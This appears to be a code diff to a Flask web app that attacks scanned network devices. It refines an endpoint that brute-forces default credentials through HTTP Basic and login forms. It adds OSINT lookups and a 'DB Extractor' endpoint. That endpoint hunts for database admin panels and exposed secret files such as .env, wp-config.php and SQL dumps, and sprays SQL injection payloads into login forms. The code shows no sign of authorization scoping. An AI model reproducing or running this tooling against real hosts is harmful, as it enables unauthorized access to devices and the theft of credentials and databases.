@@ -644,19 +644,22 @@ def api_brute_device(user, item_id):
     port = item.get("port", 80)
     device = item.get("device", "")
     scheme = "https" if port in (443, 8443, 9443) else "http"
+    base_url = f"{scheme}://{ip}:{port}"
 
     body_data = request.get_json(force=True) or {}
     custom_creds = body_data.get("creds", [])
     max_tries = int(body_data.get("max_tries", 50))
 
-    # Get unauth baseline + login form
+    # Use a session to persist cookies across requests
+    ses = http_req.Session()
+
+    # Get unauth baseline WITH redirects to capture actual login page
     unauth_body = ""
     unauth_title = ""
     unauth_forms = None
     login_form = None
-    base_url = f"{scheme}://{ip}:{port}"
     try:
-        u = http_req.get(base_url, timeout=5, allow_redirects=False, verify=False)
+        u = ses.get(base_url, timeout=8, allow_redirects=True, verify=False)
         unauth_body = u.text or ""
         unauth_title = extract_title(unauth_body)
         unauth_forms = extract_form_fields(unauth_body)
@@ -670,10 +673,8 @@ def api_brute_device(user, item_id):
         creds_to_try = [(u, p, n) for u, p, n in get_relevant_creds(device, max_creds=max_tries)]
 
     def check_auth_success(user, pw, note, r):
-        if r is None:
-            return None
-        if r.status_code == 401:
-            return None
+        if r is None: return None
+        if r.status_code == 401: return None
         if r.status_code in (302, 301):
             dest = r.headers.get("Location", "").lower()
             if not any(x in dest for x in ("login", "auth", "signin", "logon")):
@@ -710,27 +711,23 @@ def api_brute_device(user, item_id):
     working = []
 
     # Phase 1: HTTP Basic Auth
-    for user, pw, note in creds_to_try:
-        if len(working) >= 5:
-            break
+    for u, p, n in creds_to_try:
+        if len(working) >= 5: break
         try:
-            r = http_req.get(base_url, auth=(user, pw), timeout=5, allow_redirects=False, verify=False)
-            result = check_auth_success(user, pw, note, r)
-            if result:
-                working.append(result)
+            r = ses.get(base_url, auth=(u, p), timeout=5, allow_redirects=True, verify=False)
+            result = check_auth_success(u, p, n, r)
+            if result: working.append(result)
         except:
             pass
 
-    # Phase 2: Form-based login (if login form detected)
+    # Phase 2: Form-based login (with session cookies from unauth GET)
     if login_form and len(working) == 0:
-        for user, pw, note in creds_to_try:
-            if len(working) >= 5:
-                break
+        for u, p, n in creds_to_try:
+            if len(working) >= 5: break
             try:
-                r = try_form_auth(ip, port, scheme, user, pw, login_form, base_url)
-                result = check_auth_success(user, pw, note, r)
-                if result:
-                    working.append(result)
+                r = try_form_auth(ip, port, scheme, u, p, login_form, base_url, session=ses)
+                result = check_auth_success(u, p, n, r)
+                if result: working.append(result)
             except:
                 pass
 
@@ -1458,25 +1455,47 @@ def api_dashboard_stats(user):
 
 # ─────────────── OSINT Tools ───────────────
 
+def _resolve_dns(name):
+    import socket
+    try:
+        return socket.gethostbyname(name)
+    except:
+        pass
+    try:
+        r = requests.get(f"https://dns.google/resolve?name={name}&type=A", timeout=5)
+        if r.ok:
+            for ans in r.json().get("Answer", []):
+                if ans.get("type") == 1:
+                    return ans["data"]
+    except:
+        pass
+    return None
+
+
 @app.route("/api/osint/ip", methods=["POST"])
 @require_auth
 def api_osint_ip(user):
-    import socket, struct
+    import socket
     body = request.get_json(force=True) or {}
     target = body.get("target", "").strip()
     if not target:
         return jsonify({"error": "target required"}), 400
-    result = {"target": target, "dns": {}, "geo": None, "reverse_dns": None}
+    result = {"target": target, "ip": None, "geo": None, "reverse_dns": None}
+    # Check if target is already an IP
     try:
-        addr = socket.gethostbyname(target)
-        result["dns"]["a_record"] = addr
-        try:
-            host = socket.gethostbyaddr(addr)
-            result["reverse_dns"] = host[0]
-        except:
-            pass
-    except Exception as e:
-        return jsonify({"error": f"DNS resolution failed: {e}"}), 400
+        socket.inet_aton(target)
+        addr = target
+        result["ip"] = addr
+    except socket.error:
+        addr = _resolve_dns(target)
+        if not addr:
+            return jsonify({"error": f"DNS resolution failed for '{target}'"}), 400
+        result["ip"] = addr
+    try:
+        host = socket.gethostbyaddr(addr)
+        result["reverse_dns"] = host[0]
+    except:
+        pass
     try:
         r = requests.get(f"http://ip-api.com/json/{addr}?fields=66846719", timeout=5)
         if r.ok:
@@ -1495,16 +1514,13 @@ def api_osint_dns(user):
     if not domain:
         return jsonify({"error": "domain required"}), 400
     result = {"domain": domain, "records": {}}
-    try:
-        result["records"]["a"] = socket.gethostbyname(domain)
-    except:
-        result["records"]["a"] = None
-    try:
-        result["records"]["mx"] = []
-        _, _, addrlist = socket.gethostbyname_ex(domain)
-        result["records"]["mx"] = addrlist[:5]
-    except:
-        pass
+    addr = _resolve_dns(domain)
+    result["records"]["a"] = addr
+    if addr:
+        try:
+            result["records"]["mx"] = list(socket.gethostbyname_ex(domain)[2])
+        except:
+            pass
     return jsonify(result)
 
 
@@ -1524,6 +1540,155 @@ def api_osint_email(user):
     name = domain.split("@")[-1] if "@" in domain else domain
     common = [p.format(d=name) for p in patterns]
     return jsonify({"domain": name, "emails": common, "count": len(common)})
+
+
+# ─────────────── DB Extractor ───────────────
+
+DB_TOOL_PATHS = [
+    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/adminer/", "/adminer.php",
+    "/mysql/", "/sql/", "/phpmyadmin2/", "/phpPgAdmin/",
+    "/pgadmin/", "/sqlbuddy/", "/myadmin/", "/webadmin/",
+    "/panel/database", "/db/", "/database/", "/dbadmin/",
+]
+
+COMMON_BACKUP_PATHS = [
+    "/backup/", "/backup.sql", "/db.sql", "/database.sql",
+    "/dump.sql", "/sql.sql", "/config.bak", "/config.php~",
+    "/.env", "/.env.bak", "/config.php.bak", "/wp-config.php",
+    "/.git/config", "/app/config.php", "/config/", "/admin/config.php",
+    "/private/config.php", "/includes/config.php",
+]
+
+SQLI_PAYLOADS = ["' OR 1=1 --", "' OR '1'='1", "admin' --", "' UNION SELECT 1,2,3 --",
+                  "1' OR '1'='1", "\" OR 1=1 --", "admin\" --"]
+
+
+@app.route("/api/devices/<item_id>/db-extract", methods=["POST"])
+@require_auth
+def api_db_extract(user, item_id):
+    import requests as http_req
+    body = request.get_json(force=True) or {}
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
+        if not resp.data:
+            return jsonify({"error": "not found"}), 404
+        item = resp.data[0]
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+    ip = item.get("ip", "")
+    port = item.get("port", 80)
+    scheme = "https" if port in (443, 8443, 9443) else "http"
+    base_url = f"{scheme}://{ip}:{port}"
+    ses = http_req.Session()
+    results = []
+
+    # Phase 1: Check for DB admin tools
+    for path in DB_TOOL_PATHS:
+        url = base_url + path
+        try:
+            r = ses.get(url, timeout=4, verify=False, allow_redirects=True)
+            text = (r.text or "").lower()
+            if r.status_code == 200 and len(text) > 50:
+                keywords = ["phpmyadmin", "adminer", "mysql", "database", "server", "sql", "phpmyadmin",
+                            "php pgadmin", "pgadmin", "sqlbuddy"]
+                if any(k in text for k in keywords):
+                    results.append({"type": "db_tool", "url": url, "detail": f"Accessible ({r.status_code})"})
+        except:
+            pass
+
+    # Phase 2: Check for backup / config files
+    for path in COMMON_BACKUP_PATHS:
+        url = base_url + path
+        try:
+            r = ses.get(url, timeout=4, verify=False, allow_redirects=False)
+            if r.status_code == 200:
+                ct = (r.headers.get("Content-Type", "") or "").lower()
+                text = r.text or ""
+                if any(k in text.lower() for k in ("password", "db_host", "db_user", "db_name", "sql",
+                                                     "mysql", "insert into", "create table", "define(")):
+                    results.append({"type": "config_leak", "url": url, "detail": f"Potential leak ({len(text)} bytes)"})
+                elif "text/plain" in ct or "application/octet" in ct:
+                    results.append({"type": "backup_file", "url": url, "detail": f"Accessible ({len(text)} bytes)"})
+        except:
+            pass
+
+    # Phase 3: SQL injection test on login form fields
+    try:
+        r = ses.get(base_url, timeout=5, allow_redirects=True, verify=False)
+        page = r.text or ""
+    except:
+        page = ""
+
+    from GetYourDevice import extract_login_form, extract_form_fields, body_has_password_input
+    login_form = extract_login_form(page)
+    sqli_findings = []
+
+    if login_form and login_form.get("inputs"):
+        action_url = login_form["action"]
+        if action_url.startswith("/"):
+            action_url = f"{scheme}://{ip}:{port}{action_url}"
+        elif not action_url.startswith("http"):
+            action_url = f"{base_url}/{action_url}"
+        method = login_form.get("method", "POST")
+
+        for payload in SQLI_PAYLOADS:
+            data = {}
+            has_pw = False
+            for inp in login_form["inputs"]:
+                inp_type = inp.get("type", "text").lower()
+                inp_name = inp.get("name", "")
+                if inp_type == "password":
+                    data[inp_name] = payload
+                    has_pw = True
+                elif inp_type == "hidden":
+                    data[inp_name] = inp.get("value", "")
+                else:
+                    data[inp_name] = payload
+            if not has_pw:
+                # Use payload in all text fields
+                for inp in login_form["inputs"]:
+                    if inp.get("type", "text").lower() not in ("hidden", "submit", "button"):
+                        data[inp.get("name", "")] = payload
+            try:
+                if method == "GET":
+                    resp = ses.get(action_url, params=data, timeout=5, allow_redirects=False, verify=False)
+                else:
+                    resp = ses.post(action_url, data=data, timeout=5, allow_redirects=False, verify=False)
+
+                body = resp.text or ""
+                body_lower = body.lower()[:3000]
+                # Check for SQL error messages
+                sql_errors = ["sql syntax", "mysql_fetch", "sqlite", "odbc", "you have an error in your sql",
+                              "unclosed quotation mark", "warning: mysql", "supplied argument is not a valid mysql",
+                              "pg_query", "sqlsrv", "driver", "db2_", "oci_"]
+                found_errors = [e for e in sql_errors if e in body_lower]
+                if found_errors:
+                    sqli_findings.append({
+                        "payload": payload,
+                        "status": resp.status_code,
+                        "errors": found_errors[:3],
+                        "is_vulnerable": True,
+                    })
+                # Also check if response is different from baseline (possible blind SQLi)
+                if resp.status_code == 200:
+                    from difflib import SequenceMatcher
+                    ratio = SequenceMatcher(None, page[:2000], body[:2000]).ratio()
+                    if ratio < 0.85 and ratio > 0.10:
+                        sqli_findings.append({
+                            "payload": payload,
+                            "status": resp.status_code,
+                            "diff_ratio": round(ratio, 3),
+                            "is_vulnerable": False,
+                            "errors": ["Significant response difference - possible SQLi"],
+                        })
+            except:
+                pass
+
+    if sqli_findings:
+        results.append({"type": "sql_injection", "detail": f"{len(sqli_findings)} tests", "findings": sqli_findings[:5]})
+
+    return jsonify({"status": "ok", "device": f"{ip}:{port}", "findings": results, "total": len(results)})
 
 
 @app.route("/api/health")
